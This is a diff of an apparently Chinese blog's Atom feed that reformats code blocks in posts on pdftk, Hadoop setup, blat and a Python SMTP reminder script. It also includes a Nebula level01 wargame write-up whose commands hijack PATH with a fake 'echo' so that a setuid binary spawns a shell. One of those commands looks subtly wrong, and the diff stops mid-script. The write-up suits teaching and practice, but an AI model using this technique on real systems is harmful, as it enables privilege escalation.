@@ -4,7 +4,7 @@
   <title><![CDATA[Goorockey's Blog]]></title>
   <link href="http://www.goorockey.com/atom.xml" rel="self"/>
   <link href="http://www.goorockey.com/"/>
-  <updated>2014-04-29T00:38:00+08:00</updated>
+  <updated>2014-04-29T01:13:44+08:00</updated>
   <id>http://www.goorockey.com/</id>
   <author>
     <name><![CDATA[Goorockey]]></name>
@@ -200,8 +200,8 @@
 
 <p><a href="http://www.pdflabs.com/tools/pdftk-the-pdf-toolkit/" title="pdftk">pdftk</a>也是一个pdf方面的神奇，可以完成pdf合并、合并多个pdf指定页、分割、加水印等，而且是跨windows、linux、mac多个平台的。不过我也只用来合并pdf:</p>
 
-<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
-</pre></td><td class="code"><pre><code class=""><span class="line">$ pdftk 1.pdf 2.pdf cat output 12.pdf</span></code></pre></td></tr></table></div></figure></notextile></div>
+<pre><code>$ pdftk 1.pdf 2.pdf cat output 12.pdf
+</code></pre>
 
 <p>但弄出来的pdf是没有目录的。</p>
 
@@ -250,10 +250,9 @@
 
 <p>确保ssh,sshd,rsync,jdk都有了。同时要保证ssh localhost不要输入密码的认证步骤。具体docs/quickstart也有说，可以这样：</p>
 
-<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
-<span class="line-number">2</span>
-</pre></td><td class="code"><pre><code class=""><span class="line">$ ssh-keygen -t dsa -P '' -f ~/.ssh/id_dsa
-</span><span class="line">$ cat ~/.ssh/id_dsa.pub &gt;&gt; ~/.ssh/authorized_keys</span></code></pre></td></tr></table></div></figure></notextile></div>
+<pre><code>$ ssh-keygen -t dsa -P '' -f ~/.ssh/id_dsa
+$ cat ~/.ssh/id_dsa.pub &gt;&gt; ~/.ssh/authorized_keys
+</code></pre>
 
 <p>然后是设置jdk的目录，修改conf/hadoop-env.sh中JAVA_HOME。一般为/usr/lib/jvm/下的某个java目录，我就直接写成/usr/lib/jvm/default-java了。</p>
 
@@ -272,32 +271,22 @@
 
 <p>现在执行一个例子:</p>
 
-<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
-<span class="line-number">2</span>
-<span class="line-number">3</span>
-<span class="line-number">4</span>
-<span class="line-number">5</span>
-<span class="line-number">6</span>
-<span class="line-number">7</span>
-<span class="line-number">8</span>
-<span class="line-number">9</span>
-<span class="line-number">10</span>
-<span class="line-number">11</span>
-<span class="line-number">12</span>
-<span class="line-number">13</span>
-</pre></td><td class="code"><pre><code class=""><span class="line">$ mkdir input
-</span><span class="line">$ cp conf/*.xml input/
-</span><span class="line">
-</span><span class="line">$ bin/hadoop fs -put intput input   # 把当前文件系统input目录复制为HDFS的input
-</span><span class="line">$ bin/hadoop jar hadoop-*-examples.jar grep input output 'dfs[a-z.]+'  # 执行所有example.jar，后面的是参数
-</span><span class="line">
-</span><span class="line"># 一段时间后，执行完毕 #
-</span><span class="line">$ bin/hadoop fs -get output output # 把HDFS中的output目录复制为当前文件系统的ouput
-</span><span class="line">$ cat output/* # 打印结果
-</span><span class="line">
-</span><span class="line"># 或者直接对HDFS操作 #
-</span><span class="line">$ bin/hadoop fs -ls output
-</span><span class="line">$ bin/hadoop fs -cat output/*</span></code></pre></td></tr></table></div></figure></notextile></div>
+<pre><code>$ mkdir input
+$ cp conf/*.xml input/
+
+$ bin/hadoop fs -put intput input   # 把当前文件系统input目录复制为HDFS的input
+$ bin/hadoop jar hadoop-*-examples.jar grep input output 'dfs[a-z.]+'  # 执行所有example.jar，后面的是参数
+</code></pre>
+
+<h1 id="section-2">一段时间后，执行完毕</h1>
+<pre><code>$ bin/hadoop fs -get output output # 把HDFS中的output目录复制为当前文件系统的ouput
+$ cat output/* # 打印结果
+</code></pre>
+
+<h1 id="hdfs">或者直接对HDFS操作</h1>
+<pre><code>$ bin/hadoop fs -ls output
+$ bin/hadoop fs -cat output/*
+</code></pre>
 
 <h3 id="wordcount">WordCount例子</h3>
 
@@ -305,42 +294,31 @@
 
 <p>Hadoop是通过<a href="http://wiki.apache.org/hadoop/HadoopMapReduce" title="MapReduce">MapReduce</a>机制来处理大数据的。Map阶段分割输入的数据，并整合成&lt;key,value&gt;的对应关系。每对&lt;key,value&gt;对送到Combiner做每个key的整合，当整合出一定数量的&lt;key,value&gt;后，&lt;key,value&gt;会送到Reducer做处理输出最终的&lt;key,value&gt;。</p>
 
-<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
-</pre></td><td class="code"><pre><code class=""><span class="line">(input) &lt;k1, v1&gt; -&gt; map -&gt; &lt;k2, v2&gt; -&gt; combine -&gt; &lt;k2, v2&gt; -&gt; reduce -&gt; &lt;k3, v3&gt; (output)</span></code></pre></td></tr></table></div></figure></notextile></div>
+<pre><code>(input) &lt;k1, v1&gt; -&gt; map -&gt; &lt;k2, v2&gt; -&gt; combine -&gt; &lt;k2, v2&gt; -&gt; reduce -&gt; &lt;k3, v3&gt; (output) 
+</code></pre>
 
 <p>按照<a href="http://hadoop.apache.org/docs/stable/mapred_tutorial.html" title="WordCount">WordCount</a>中的代码编辑WordCount.java，然后编译打包生成wordcount.jar:</p>
 
-<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
-<span class="line-number">2</span>
-<span class="line-number">3</span>
-</pre></td><td class="code"><pre><code class=""><span class="line">$ mkdir wordcount_classes
-</span><span class="line">$ javac -classpath hadoop-hop-0.2-core.jar -d wordcount_classes WordCount.java
-</span><span class="line">$ jar -cvf wordcount.jar -C wordcount_classes/ .</span></code></pre></td></tr></table></div></figure></notextile></div>
+<pre><code>$ mkdir wordcount_classes
+$ javac -classpath hadoop-hop-0.2-core.jar -d wordcount_classes WordCount.java
+$ jar -cvf wordcount.jar -C wordcount_classes/ . 
+</code></pre>
 
 <p>然后自行构造一些要统计的文件，放在input目录下。这时候注意，在执行了上一次例子后，如果想把输入文件还是放在HDFS的input下，要先清空原来的文件:</p>
 
-<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
-<span class="line-number">2</span>
-<span class="line-number">3</span>
-<span class="line-number">4</span>
-<span class="line-number">5</span>
-<span class="line-number">6</span>
-<span class="line-number">7</span>
-<span class="line-number">8</span>
-<span class="line-number">9</span>
-<span class="line-number">10</span>
-</pre></td><td class="code"><pre><code class=""><span class="line">$ bin/hadoop fs -rmr input/
-</span><span class="line">$ bin/hadoop fs -rmr output/
-</span><span class="line">
-</span><span class="line">$ bin/hadoop fs -put input input # 把输入文件目录input重新放到HDFS中
-</span><span class="line">
-</span><span class="line">$ bin/hadoop jar wordcount.jar org.myorg.WordCount input output  # 执行wordcount.jar
-</span><span class="line">
-</span><span class="line"># 执行一段时间后完毕 #
-</span><span class="line">
-</span><span class="line">$ bin/hadoop fs -cat output/*  # 打印结果</span></code></pre></td></tr></table></div></figure></notextile></div>
+<pre><code>$ bin/hadoop fs -rmr input/
+$ bin/hadoop fs -rmr output/
 
-<h3 id="section-2">结语</h3>
+$ bin/hadoop fs -put input input # 把输入文件目录input重新放到HDFS中
+
+$ bin/hadoop jar wordcount.jar org.myorg.WordCount input output  # 执行wordcount.jar
+
+# 执行一段时间后完毕 #
+
+$ bin/hadoop fs -cat output/*  # 打印结果
+</code></pre>
+
+<h3 id="section-3">结语</h3>
 
 <p>尝试了一下Hadoop，还有更多有待研究
 <br />
@@ -362,43 +340,25 @@
 
 <p>题目提供了/home/flag01/下flag01的源码：</p>
 
-<div class="bogus-wrapper"><notextile><figure class="code"> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
-<span class="line-number">2</span>
-<span class="line-number">3</span>
-<span class="line-number">4</span>
-<span class="line-number">5</span>
-<span class="line-number">6</span>
-<span class="line-number">7</span>
-<span class="line-number">8</span>
-<span class="line-number">9</span>
-<span class="line-number">10</span>
-<span class="line-number">11</span>
-<span class="line-number">12</span>
-<span class="line-number">13</span>
-<span class="line-number">14</span>
-<span class="line-number">15</span>
-<span class="line-number">16</span>
-<span class="line-number">17</span>
-<span class="line-number">18</span>
-</pre></td><td class="code"><pre><code class="c"><span class="line"><span class="cp">#include &lt;stdlib.h&gt;</span>
-</span><span class="line"><span class="cp">#include &lt;unistd.h&gt;</span>
-</span><span class="line"><span class="cp">#include &lt;string.h&gt;</span>
-</span><span class="line"><span class="cp">#include &lt;sys/types.h&gt;</span>
-</span><span class="line"><span class="cp">#include &lt;stdio.h&gt;</span>
-</span><span class="line">
-</span><span class="line"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
-</span><span class="line"><span class="p">{</span>
-</span><span class="line">    <span class="n">gid_t</span> <span class="n">gid</span><span class="p">;</span>
-</span><span class="line">    <span class="n">uid_t</span> <span class="n">uid</span><span class="p">;</span>
-</span><span class="line">    <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
-</span><span class="line">    <span class="n">uid</span> <span class="o">=</span> <span class="n">geteuid</span><span class="p">();</span>
-</span><span class="line">
-</span><span class="line">    <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
-</span><span class="line">    <span class="n">setresuid</span><span class="p">(</span><span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>
-</span><span class="line">
-</span><span class="line">    <span class="n">system</span><span class="p">(</span><span class="s">&quot;/usr/bin/env echo and now what?&quot;</span><span class="p">);</span>
-</span><span class="line"><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure></notextile></div>
+<pre><code>#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdio.h&gt;
+
+int main(int argc, char **argv, char **envp)
+{
+    gid_t gid;
+    uid_t uid;
+    gid = getegid();
+    uid = geteuid();
+
+    setresgid(gid, gid, gid);
+    setresuid(uid, uid, uid);
+
+    system("/usr/bin/env echo and now what?");
+}
+</code></pre>
 
 <p>flag01的权限：</p>
 
@@ -410,20 +370,14 @@
 
 <p><strong>解决方法</strong>网上都有：</p>
 
-<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
-<span class="line-number">2</span>
-<span class="line-number">3</span>
-<span class="line-number">4</span>
-<span class="line-number">5</span>
-<span class="line-number">6</span>
-<span class="line-number">7</span>
-</pre></td><td class="code"><pre><code class=""><span class="line">$ export PATH=/tmp:$PATH    # 把/tmp加到环境变量PATH的最前头
-</span><span class="line">$ cat "/bin/bash" &gt;&gt; /tmp/echo # 在/tmp创建一个echo文件，里面是执行bash
-</span><span class="line">$ chmod +x /tmp/echo # 把/tmp/echo设为执行文件
-</span><span class="line">$ /home/flag01/flag01 # 执行/home/flag01下的flag01
-</span><span class="line">
-</span><span class="line"># 顺利以用户flag01起bash
-</span><span class="line">$ getflag # 通关</span></code></pre></td></tr></table></div></figure></notextile></div>
+<pre><code>$ export PATH=/tmp:$PATH    # 把/tmp加到环境变量PATH的最前头
+$ cat "/bin/bash" &gt;&gt; /tmp/echo # 在/tmp创建一个echo文件，里面是执行bash
+$ chmod +x /tmp/echo # 把/tmp/echo设为执行文件
+$ /home/flag01/flag01 # 执行/home/flag01下的flag01
+
+# 顺利以用户flag01起bash
+$ getflag # 通关
+</code></pre>
 
 <h3 id="section-1">原理</h3>
 
@@ -502,17 +456,12 @@
 
 <p>执行blat -h 或者看官网上的帮助，使用blat发邮件还是很简单的（所以官网特别提醒不要用blat来发SPAM。。)</p>
 
-<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>blat基本用法 </span></figcaption>
-<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
-<span class="line-number">2</span>
-<span class="line-number">3</span>
-<span class="line-number">4</span>
-<span class="line-number">5</span>
-</pre></td><td class="code"><pre><code class=""><span class="line">blat &lt;邮件正文文件&gt; -from &lt;发送地址&gt; -to &lt;接受地址&gt; -subject &lt;邮件标题&gt; 
-</span><span class="line">        -server &lt;smtp服务器地址&gt; -username &lt;登录服务器用户名&gt; -password &lt;密码&gt;
-</span><span class="line">
-</span><span class="line">blat - -body &lt;邮件正文&gt; -from &lt;发送地址&gt; -to &lt;接受地址&gt; -subject &lt;邮件标题&gt; 
-</span><span class="line">        -server &lt;smtp服务器地址&gt; -username &lt;登录服务器用户名&gt; -password &lt;密码&gt;</span></code></pre></td></tr></table></div></figure></notextile></div>
+<pre><code>blat &lt;邮件正文文件&gt; -from &lt;发送地址&gt; -to &lt;接受地址&gt; -subject &lt;邮件标题&gt; 
+        -server &lt;smtp服务器地址&gt; -username &lt;登录服务器用户名&gt; -password &lt;密码&gt;
+
+blat - -body &lt;邮件正文&gt; -from &lt;发送地址&gt; -to &lt;接受地址&gt; -subject &lt;邮件标题&gt; 
+        -server &lt;smtp服务器地址&gt; -username &lt;登录服务器用户名&gt; -password &lt;密码&gt;
+</code></pre>
 
 <p>blat还可以通过-install把参数保存到注册表。blat确实是自动发邮件的大杀器！</p>
 
@@ -540,32 +489,21 @@
 
 <p>python有<a href="http://docs.python.org/library/smtplib.html" title="smtplib">smtplib</a>库实现smtp发邮件，核心代码也很简单：</p>
 
-<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>using smtplib  </span></figcaption>
- <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
-<span class="line-number">2</span>
-<span class="line-number">3</span>
-<span class="line-number">4</span>
-<span class="line-number">5</span>
-<span class="line-number">6</span>
-<span class="line-number">7</span>
-</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="kn">import</span> <span class="nn">smtplib</span>
-</span><span class="line"><span class="c"># some code ...</span>
-</span><span class="line"><span class="n">smtp</span> <span class="o">=</span> <span class="n">smtplib</span><span class="o">.</span><span class="n">SMTP</span><span class="p">()</span>
-</span><span class="line"><span class="n">smtp</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">server</span><span class="p">)</span>
-</span><span class="line"><span class="n">smtp</span><span class="o">.</span><span class="n">login</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
-</span><span class="line"><span class="n">smtp</span><span class="o">.</span><span class="n">sendmail</span><span class="p">(</span><span class="n">sender</span><span class="p">,</span> <span class="n">receiver</span><span class="p">,</span> <span class="n">msg</span><span class="p">)</span>
-</span><span class="line"><span class="n">smtp</span><span class="o">.</span><span class="n">quit</span><span class="p">()</span>
-</span></code></pre></td></tr></table></div></figure></notextile></div>
+<pre><code>import smtplib
+# some code ...
+smtp = smtplib.SMTP()
+smtp.connect(server)
+smtp.login(username, password)
+smtp.sendmail(sender, receiver, msg)
+smtp.quit()
+</code></pre>
 
 <p>而用python计算相差的天数更是简单不过：</p>
 
-<div class="bogus-wrapper"><notextile><figure class="code"> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
-<span class="line-number">2</span>
-<span class="line-number">3</span>
-</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="kn">import</span> <span class="nn">datetime</span>
-</span><span class="line"><span class="c"># some code ...</span>
-</span><span class="line"><span class="n">days</span> <span class="o">=</span> <span class="p">(</span><span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span> <span class="o">-</span> <span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="p">(</span><span class="mi">2012</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mi">30</span><span class="p">))</span><span class="o">.</span><span class="n">days</span>
-</span></code></pre></td></tr></table></div></figure></notextile></div>
+<pre><code>import datetime
+# some code ...
+days = (datetime.datetime.now() - datetime.datetime(2012,9,30)).days
+</code></pre>
 
 <h3 id="section-1">2.定时</h3>
 <p>定时在windows可以用计划任务实现</p>
@@ -574,222 +512,115 @@
 
 <h3 id="section-2">3.整个代码</h3>
 
-<div class="bogus-wrapper"><notextile><figure class="code"> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
-<span class="line-number">2</span>
-<span class="line-number">3</span>
-<span class="line-number">4</span>
-<span class="line-number">5</span>
-<span class="line-number">6</span>
-<span class="line-number">7</span>
-<span class="line-number">8</span>
-<span class="line-number">9</span>
-<span class="line-number">10</span>
-<span class="line-number">11</span>
-<span class="line-number">12</span>
-<span class="line-number">13</span>
-<span class="line-number">14</span>
-<span class="line-number">15</span>
-<span class="line-number">16</span>
-<span class="line-number">17</span>
-<span class="line-number">18</span>
-<span class="line-number">19</span>
-<span class="line-number">20</span>
-<span class="line-number">21</span>
-<span class="line-number">22</span>
-<span class="line-number">23</span>
-<span class="line-number">24</span>
-<span class="line-number">25</span>
-<span class="line-number">26</span>
-<span class="line-number">27</span>
-<span class="line-number">28</span>
-<span class="line-number">29</span>
-<span class="line-number">30</span>
-<span class="line-number">31</span>
-<span class="line-number">32</span>
-<span class="line-number">33</span>
-<span class="line-number">34</span>
-<span class="line-number">35</span>
-<span class="line-number">36</span>
-<span class="line-number">37</span>
-<span class="line-number">38</span>
-<span class="line-number">39</span>
-<span class="line-number">40</span>
-<span class="line-number">41</span>
-<span class="line-number">42</span>
-<span class="line-number">43</span>
-<span class="line-number">44</span>
-<span class="line-number">45</span>
-<span class="line-number">46</span>
-<span class="line-number">47</span>
-<span class="line-number">48</span>
-<span class="line-number">49</span>
-<span class="line-number">50</span>
-<span class="line-number">51</span>
-<span class="line-number">52</span>
-<span class="line-number">53</span>
-<span class="line-number">54</span>
-<span class="line-number">55</span>
-<span class="line-number">56</span>
-<span class="line-number">57</span>
-<span class="line-number">58</span>
-<span class="line-number">59</span>
-<span class="line-number">60</span>
-<span class="line-number">61</span>
-<span class="line-number">62</span>
-<span class="line-number">63</span>
-<span class="line-number">64</span>
-<span class="line-number">65</span>
-<span class="line-number">66</span>
-<span class="line-number">67</span>
-<span class="line-number">68</span>
-<span class="line-number">69</span>
-<span class="line-number">70</span>
-<span class="line-number">71</span>
-<span class="line-number">72</span>
-<span class="line-number">73</span>
-<span class="line-number">74</span>
-<span class="line-number">75</span>
-<span class="line-number">76</span>
-<span class="line-number">77</span>
-<span class="line-number">78</span>
-<span class="line-number">79</span>
-<span class="line-number">80</span>
-<span class="line-number">81</span>
-<span class="line-number">82</span>
-<span class="line-number">83</span>
-<span class="line-number">84</span>
-<span class="line-number">85</span>
-<span class="line-number">86</span>
-<span class="line-number">87</span>
-<span class="line-number">88</span>
-<span class="line-number">89</span>
-<span class="line-number">90</span>
-<span class="line-number">91</span>
-<span class="line-number">92</span>
-<span class="line-number">93</span>
-<span class="line-number">94</span>
-<span class="line-number">95</span>
-<span class="line-number">96</span>
-<span class="line-number">97</span>
-<span class="line-number">98</span>
-<span class="line-number">99</span>
-<span class="line-number">100</span>
-<span class="line-number">101</span>
-<span class="line-number">102</span>
-<span class="line-number">103</span>
-<span class="line-number">104</span>
-<span class="line-number">105</span>
-</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="c">#coding=utf-8</span>
-</span><span class="line"><span class="kn">import</span> <span class="nn">smtplib</span>
-</span><span class="line"><span class="kn">import</span> <span class="nn">datetime</span>
-</span><span class="line"><span class="kn">import</span> <span class="nn">sys</span>
-</span><span class="line">
-</span><span class="line"><span class="kn">from</span> <span class="nn">email.mime.text</span> <span class="kn">import</span> <span class="n">MIMEText</span>
-</span><span class="line"><span class="kn">from</span> <span class="nn">email.header</span> <span class="kn">import</span> <span class="n">Header</span>
-</span><span class="line">
-</span><span class="line">
-</span><span class="line"><span class="n">member</span> <span class="o">=</span> <span class="p">((</span><span class="s">&#39;member1&#39;</span><span class="p">,</span> <span class="s">&#39;member2&#39;</span><span class="p">,</span> <span class="s">&#39;member3&#39;</span><span class="p">,</span> <span class="s">&#39;member4&#39;</span><span class="p">,</span> <span class="s">&#39;member5&#39;</span><span class="p">,</span> <span class="s">&#39;member6&#39;</span><span class="p">),</span>
-</span><span class="line">        <span class="p">(</span><span class="s">&#39;member7&#39;</span><span class="p">,</span> <span class="s">&#39;member8&#39;</span><span class="p">,</span> <span class="s">&#39;member9&#39;</span><span class="p">,</span> <span class="s">&#39;member10&#39;</span><span class="p">,</span> <span class="s">&#39;member11&#39;</span><span class="p">,</span> <span class="s">&#39;member12&#39;</span><span class="p">))</span>
-</span><span class="line">
-</span><span class="line"><span class="n">suffix</span> <span class="o">=</span> <span class="s">&#39;@abc.com&#39;</span>
-</span><span class="line">
-</span><span class="line"><span class="k">def</span> <span class="nf">send_mail</span><span class="p">(</span><span class="n">receiver</span><span class="p">,</span> <span class="n">content_filename</span><span class="p">,</span>
-</span><span class="line">            <span class="n">sender</span> <span class="o">=</span> <span class="s">&#39;admin@abc.com&#39;</span><span class="p">,</span>
-</span><span class="line">            <span class="n">server</span> <span class="o">=</span> <span class="s">&#39;192.168.1.1&#39;</span><span class="p">,</span>
-</span><span class="line">            <span class="n">username</span> <span class="o">=</span> <span class="s">&#39;admin@abc.com&#39;</span><span class="p">,</span>
-</span><span class="line">            <span class="n">password</span> <span class="o">=</span> <span class="s">&#39;admin&#39;</span><span class="p">):</span>
-</span><span class="line">
-</span><span class="line">    <span class="n">subject</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
-</span><span class="line">    <span class="n">content</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
-</span><span class="line">
-</span><span class="line">    <span class="c"># 从文件读取邮件正文</span>
-</span><span class="line">    <span class="k">try</span><span class="p">:</span>
-</span><span class="line">        <span class="n">content_file</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">content_filename</span><span class="p">,</span> <span class="s">&#39;r&#39;</span><span class="p">)</span>
-</span><span class="line">        <span class="k">try</span><span class="p">:</span>
-</span><span class="line">            <span class="n">subject</span> <span class="o">=</span> <span class="n">content_file</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span>
-</span><span class="line">            <span class="n">content</span> <span class="o">=</span> <span class="n">content_file</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
-</span><span class="line">
-</span><span class="line">            <span class="c"># 转为utf-8</span>
-</span><span class="line">            <span class="n">subject</span> <span class="o">=</span> <span class="n">subject</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">&#39;gbk&#39;</span><span class="p">,</span> <span class="s">&#39;ignore&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&#39;utf-8&#39;</span><span class="p">)</span>
-</span><span class="line">            <span class="n">content</span> <span class="o">=</span> <span class="n">content</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">&#39;gbk&#39;</span><span class="p">,</span> <span class="s">&#39;ignore&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&#39;utf-8&#39;</span><span class="p">)</span>
-</span><span class="line">        <span class="k">finally</span><span class="p">:</span>
-</span><span class="line">            <span class="n">content_file</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-</span><span class="line">    <span class="k">except</span> <span class="ne">IOError</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
-</span><span class="line">        <span class="n">sys</span><span class="o">.</span><span class="n">stderr</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s">&quot;cannot open file &quot;</span> <span class="o">+</span> <span class="n">content_filename</span><span class="p">)</span>
-</span><span class="line">        <span class="k">return</span>
-</span><span class="line">
-</span><span class="line">    <span class="n">content</span> <span class="o">=</span> <span class="n">content</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\n\n</span><span class="s">系统生成，请勿回复 :)&quot;</span>
-</span><span class="line">    <span class="c">#print content</span>
-</span><span class="line">
-</span><span class="line">    <span class="c"># 构造邮件</span>
-</span><span class="line">    <span class="n">msg</span> <span class="o">=</span> <span class="n">MIMEText</span><span class="p">(</span><span class="n">content</span><span class="p">,</span> <span class="s">&#39;plain&#39;</span><span class="p">,</span> <span class="s">&#39;utf-8&#39;</span><span class="p">)</span>
-</span><span class="line">    <span class="n">msg</span><span class="p">[</span><span class="s">&#39;Subject&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">Header</span><span class="p">(</span><span class="n">subject</span><span class="p">,</span> <span class="s">&#39;utf-8&#39;</span><span class="p">)</span>
-</span><span class="line">    <span class="n">msg</span><span class="p">[</span><span class="s">&#39;From&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">sender</span>
-</span><span class="line">    <span class="n">msg</span><span class="p">[</span><span class="s">&#39;To&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">receiver</span>
-</span><span class="line">
-</span><span class="line">
-</span><span class="line">    <span class="k">if</span> <span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">):</span>
-</span><span class="line">        <span class="k">try</span><span class="p">:</span>
-</span><span class="line">            <span class="c"># stmp模块发送邮件</span>
-</span><span class="line">            <span class="n">smtp</span> <span class="o">=</span> <span class="n">smtplib</span><span class="o">.</span><span class="n">SMTP</span><span class="p">()</span>
-</span><span class="line">            <span class="n">smtp</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">server</span><span class="p">)</span>
-</span><span class="line">            <span class="n">smtp</span><span class="o">.</span><span class="n">login</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
-</span><span class="line">            <span class="n">smtp</span><span class="o">.</span><span class="n">sendmail</span><span class="p">(</span><span class="n">sender</span><span class="p">,</span> <span class="n">receiver</span><span class="p">,</span> <span class="n">msg</span><span class="o">.</span><span class="n">as_string</span><span class="p">())</span>
-</span><span class="line">            <span class="n">smtp</span><span class="o">.</span><span class="n">quit</span><span class="p">()</span>
-</span><span class="line">
-</span><span class="line">            <span class="k">print</span> <span class="s">&quot;Success&quot;</span>
-</span><span class="line">            <span class="k">return</span> <span class="bp">True</span>
-</span><span class="line">
-</span><span class="line">        <span class="k">except</span> <span class="ne">Exception</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
-</span><span class="line">            <span class="k">print</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
-</span><span class="line">            <span class="k">return</span> <span class="bp">False</span>
-</span><span class="line">
-</span><span class="line">
-</span><span class="line"><span class="k">def</span> <span class="nf">get_on_duty</span><span class="p">():</span>
-</span><span class="line">    <span class="n">receiver</span> <span class="o">=</span> <span class="s">&#39;&#39;</span>
-</span><span class="line">    <span class="n">days</span> <span class="o">=</span> <span class="p">(</span><span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span> <span class="o">-</span> <span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="p">(</span><span class="mi">2012</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">8</span><span class="p">))</span><span class="o">.</span><span class="n">days</span>
-</span><span class="line">
-</span><span class="line">    <span class="k">if</span> <span class="n">days</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
-</span><span class="line">        <span class="n">days</span> <span class="o">=</span> <span class="n">days</span> <span class="o">+</span> <span class="mi">1</span> <span class="c"># 提前一天提醒</span>
-</span><span class="line">        <span class="n">week</span> <span class="o">=</span> <span class="p">(</span><span class="n">days</span> <span class="o">/</span> <span class="mi">7</span><span class="p">)</span> <span class="o">%</span> <span class="mi">2</span>
-</span><span class="line">        <span class="n">date</span> <span class="o">=</span> <span class="p">(</span><span class="n">days</span> <span class="o">%</span> <span class="mi">7</span><span class="p">)</span>
-</span><span class="line">
-</span><span class="line">        <span class="c"># 周六发周一的值日</span>
-</span><span class="line">        <span class="k">if</span> <span class="n">date</span> <span class="o">==</span> <span class="mi">6</span><span class="p">:</span>
-</span><span class="line">            <span class="n">date</span> <span class="o">=</span> <span class="mi">0</span>
-</span><span class="line">
-</span><span class="line">        <span class="k">if</span> <span class="n">week</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">member</span><span class="p">)</span> <span class="ow">and</span> <span class="n">date</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">member</span><span class="p">[</span><span class="n">week</span><span class="p">])</span> <span class="ow">and</span> <span class="nb">len</span><span class="p">(</span><span class="n">member</span><span class="p">[</span><span class="n">week</span><span class="p">][</span><span class="n">date</span><span class="p">])</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
-</span><span class="line">            <span class="n">receiver</span> <span class="o">=</span> <span class="n">member</span><span class="p">[</span><span class="n">week</span><span class="p">][</span><span class="n">date</span><span class="p">]</span> <span class="o">+</span> <span class="n">suffix</span>
-</span><span class="line">
-</span><span class="line">    <span class="k">return</span> <span class="n">receiver</span>
-</span><span class="line">
-</span><span class="line">
-</span><span class="line"><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
-</span><span class="line">
